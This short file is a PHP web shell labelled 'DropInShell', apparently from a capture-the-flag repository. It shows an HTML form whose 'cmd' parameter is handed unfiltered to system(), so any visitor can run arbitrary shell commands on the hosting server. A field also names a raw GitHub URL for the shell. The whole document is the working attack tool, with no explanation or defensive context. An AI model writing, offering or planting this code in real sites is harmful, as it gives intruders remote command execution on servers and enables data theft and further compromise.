
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="TEXT" name="page" value="http://raw.githubusercontent.com/nbernier/cft/master/dropinshell">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    $TITLE="DropInShell";
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
